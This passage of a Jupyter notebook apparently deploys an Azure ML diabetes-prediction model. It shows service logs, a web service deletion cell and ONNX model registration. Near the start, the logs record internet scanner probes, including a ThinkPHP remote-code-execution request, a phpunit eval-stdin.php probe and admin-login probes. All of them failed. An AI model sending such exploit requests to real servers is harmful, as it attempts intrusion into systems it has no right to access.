            "127.0.0.1 - - [31/Jan/2021:00:06:57 +0000] \"GET /index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP21 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [31/Jan/2021:00:06:57 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [31/Jan/2021:01:59:13 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "127.0.0.1 - - [31/Jan/2021:02:26:54 +0000] \"POST /boaform/admin/formLogin HTTP/1.0\" 404 232 \"http://20.193.18.43:80/admin/login.asp\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\"\n",
            "127.0.0.1 - - [31/Jan/2021:02:30:09 +0000] \"GET /robots.txt HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [31/Jan/2021:02:30:09 +0000] \"GET /sitemap.xml HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [31/Jan/2021:02:30:10 +0000] \"GET /.well-known/security.txt HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [31/Jan/2021:02:30:11 +0000] \"GET /favicon.ico HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0\"\n",
            "127.0.0.1 - - [31/Jan/2021:03:29:05 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [31/Jan/2021:03:29:06 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - f7spZQ7O [31/Jan/2021:03:29:06 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 07:27:36,626 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:07:27:36 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 07:27:37,263 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:07:27:37 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [31/Jan/2021:08:14:19 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [31/Jan/2021:08:14:20 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - ycJsCibA [31/Jan/2021:08:14:20 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [31/Jan/2021:09:49:18 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [31/Jan/2021:09:49:18 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - AwN1qbOW [31/Jan/2021:09:49:19 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:14:38,699 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:14:38 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:14:39,065 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:14:39 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:16:17,097 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:16:17 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:16:18,046 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:16:18 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:16:19,880 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:16:19 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\"\n",
            "127.0.0.1 - - [31/Jan/2021:10:16:22 +0000] \"GET /favicon.ico HTTP/1.0\" 404 232 \"http://159a4ac6-4925-4238-bd97-dbe0430d3a97.australiaeast.azurecontainer.io/swagger.json\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\"\n",
            "2021-01-31 10:16:50,450 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
            "2021-01-31 10:16:50,461 | root | ERROR | Encountered Exception: Traceback (most recent call last):\n",
            "  File \"/var/azureml-server/synchronous/routes.py\", line 64, in run_scoring\n",
            "    response = invoke_user_with_timer(service_input, request_headers)\n",
            "  File \"/var/azureml-server/synchronous/routes.py\", line 97, in invoke_user_with_timer\n",
            "    result = user_main.run(**params)\n",
            "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/wrapt/wrappers.py\", line 564, in __call__\n",
            "    args, kwargs)\n",
            "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/inference_schema/schema_decorators.py\", line 55, in decorator_input\n",
            "    args[param_position] = _deserialize_input_argument(args[param_position], param_type, param_name)\n",
            "IndexError: list index out of range\n",
            "\n",
            "During handling of the above exception, another exception occurred:\n",
            "\n",
            "Traceback (most recent call last):\n",
            "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/flask/app.py\", line 1832, in full_dispatch_request\n",
            "    rv = self.dispatch_request()\n",
            "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/flask/app.py\", line 1818, in dispatch_request\n",
            "    return self.view_functions[rule.endpoint](**req.view_args)\n",
            "  File \"/var/azureml-server/synchronous/routes.py\", line 20, in get_prediction_realtime\n",
            "    return run_scoring(service_input, request.headers, request.environ.get('REQUEST_ID', '00000000-0000-0000-0000-000000000000'))\n",
            "  File \"/var/azureml-server/synchronous/routes.py\", line 77, in run_scoring\n",
            "    raise RunFunctionException(str(exc))\n",
            "run_function_exception.RunFunctionException\n",
            "\n",
            "2021-01-31 10:16:50,461 | root | INFO | 500\n",
            "127.0.0.1 - - [31/Jan/2021:10:16:50 +0000] \"GET /score HTTP/1.0\" 500 23 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\"\n",
            "Exception in worker process\n",
            "Traceback (most recent call last):\n",
            "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/gunicorn/arbiter.py\", line 583, in spawn_worker\n",
            "    worker.init_process()\n",
            "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/gunicorn/workers/base.py\", line 134, in init_process\n",
            "    self.run()\n",
            "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/gunicorn/workers/sync.py\", line 124, in run\n",
            "    self.run_for_one(timeout)\n",
            "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/gunicorn/workers/sync.py\", line 83, in run_for_one\n",
            "    self.wait(timeout)\n",
            "  File \"/azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/python3.6/site-packages/gunicorn/workers/sync.py\", line 35, in wait\n",
            "    ret = select.select(self.wait_fds, [], [], timeout)\n",
            "  File \"/var/azureml-server/routes_common.py\", line 162, in alarm_handler\n",
            "    raise TimeoutException(error_message)\n",
            "timeout_exception.TimeoutException\n",
            "Worker exiting (pid: 41)\n",
            "worker timeout is set to 300\n",
            "Booting worker with pid: 181\n",
            "SPARK_HOME not set. Skipping PySpark Initialization.\n",
            "Initializing logger\n",
            "2021-01-31 10:17:52,398 | root | INFO | Starting up app insights client\n",
            "2021-01-31 10:17:52,398 | root | INFO | Starting up request id generator\n",
            "2021-01-31 10:17:52,398 | root | INFO | Starting up app insight hooks\n",
            "2021-01-31 10:17:52,398 | root | INFO | Invoking user's init function\n",
            "2021-01-31 10:17:54,486 | azureml.core | WARNING | Failure while loading azureml_run_type_providers. Failed to load entrypoint automl = azureml.train.automl.run:AutoMLRun._from_run_dto with exception cannot import name 'RunType'.\n",
            "Failure while loading azureml_run_type_providers. Failed to load entrypoint automl = azureml.train.automl.run:AutoMLRun._from_run_dto with exception cannot import name 'RunType'.\n",
            "2021-01-31 10:17:54,704 | root | INFO | Users's init has completed successfully\n",
            "2021-01-31 10:17:54,706 | root | INFO | Skipping middleware: dbg_model_info as it's not enabled.\n",
            "2021-01-31 10:17:54,707 | root | INFO | Skipping middleware: dbg_resource_usage as it's not enabled.\n",
            "2021-01-31 10:17:54,708 | root | INFO | Scoring timeout is found from os.environ: 60000 ms\n",
            "2021-01-31 10:23:04,938 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:23:04 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:23:42,761 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:23:42 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:23:43,380 | root | INFO | Validation Request Content-Type\n",
            "2021-01-31 10:23:43,381 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
            "2021-01-31 10:23:43,494 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:23:43 +0000] \"POST /score HTTP/1.0\" 200 58 \"-\" \"python-requests/2.25.0\"\n",
            "2021-01-31 10:24:16,313 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:24:16 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:24:16,539 | root | INFO | Validation Request Content-Type\n",
            "2021-01-31 10:24:16,539 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
            "2021-01-31 10:24:16,622 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:24:16 +0000] \"POST /score HTTP/1.0\" 200 79 \"-\" \"python-requests/2.25.0\"\n",
            "2021-01-31 10:24:44,203 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:24:44 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:24:44,501 | root | INFO | Validation Request Content-Type\n",
            "2021-01-31 10:24:44,501 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
            "2021-01-31 10:24:44,596 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:24:44 +0000] \"POST /score HTTP/1.0\" 200 58 \"-\" \"python-requests/2.25.0\"\n",
            "2021-01-31 10:25:10,585 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:25:10 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:25:12,135 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:25:12 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:39:05,900 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:39:05 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:39:06,329 | root | INFO | Validation Request Content-Type\n",
            "2021-01-31 10:39:06,329 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
            "2021-01-31 10:39:06,412 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:39:06 +0000] \"POST /score HTTP/1.0\" 200 58 \"-\" \"python-requests/2.25.0\"\n",
            "2021-01-31 10:39:34,191 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:39:34 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:39:34,381 | root | INFO | Validation Request Content-Type\n",
            "2021-01-31 10:39:34,382 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
            "2021-01-31 10:39:34,494 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:39:34 +0000] \"POST /score HTTP/1.0\" 200 79 \"-\" \"python-requests/2.25.0\"\n",
            "2021-01-31 10:40:00,300 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:40:00 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:40:01,306 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:40:01 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:41:03,063 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:41:03 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:41:03,816 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:41:03 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:43:59,093 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:43:59 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:43:59,611 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:43:59 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:47:21,848 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:47:21 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:47:23,099 | root | INFO | Validation Request Content-Type\n",
            "2021-01-31 10:47:23,099 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
            "2021-01-31 10:47:23,202 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:47:23 +0000] \"POST /score HTTP/1.0\" 200 79 \"-\" \"python-requests/2.25.0\"\n",
            "2021-01-31 10:47:45,487 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:47:45 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:47:45,700 | root | INFO | Validation Request Content-Type\n",
            "2021-01-31 10:47:45,701 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
            "2021-01-31 10:47:45,793 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:47:45 +0000] \"POST /score HTTP/1.0\" 200 79 \"-\" \"python-requests/2.25.0\"\n",
            "2021-01-31 10:48:06,843 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:48:06 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "2021-01-31 10:48:07,802 | root | INFO | 200\n",
            "127.0.0.1 - - [31/Jan/2021:10:48:07 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
            "\n"
          ]
        }
      ],
      "execution_count": 30,
      "metadata": {
        "collapsed": true,
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1612090088330
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Delete WebSERVICE"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "service = Webservice(workspace=ws, name='pimadiabetesendpv2')\n",
        "service.delete()"
      ],
      "outputs": [],
      "execution_count": 69,
      "metadata": {
        "collapsed": true,
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1611729855749
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## ONNX Model"
      ],
      "metadata": {
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from azureml.automl.runtime.onnx_convert import OnnxConverter\n",
        "\n",
        "best_run, onnx_mdl = remote_run.get_output(return_onnx_model=True)\n",
        "\n",
        "onnx_fl_path = \"./best_model.onnx\"\n",
        "OnnxConverter.save_onnx_model(onnx_mdl, onnx_fl_path)\n",
        "\n",
        "\n",
        "model = Model.register(model_path = \"./\",\n",
        "                       model_name = \"best_model.onnx\",\n",
        "                       tags = {\"onnx\": \"MyFirstonnx\"},\n",
        "                       description = \"pimadiabetesonnx\",\n",
        "                       workspace = ws)\n",
        "\n"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Registering model best_model.onnx\n"
          ]
        }
      ],
      "execution_count": 85,
      "metadata": {
        "collapsed": true,
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1611742861467
        }
      }
    }
  ],
  "metadata": {
    "kernel_info": {
      "name": "python3"
    },
    "kernelspec": {
      "name": "python3",
      "language": "python",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python",
      "version": "3.6.9",
      "mimetype": "text/x-python",
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    },
    "nteract": {
      "version": "nteract-front-end@1.0.0"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 2
}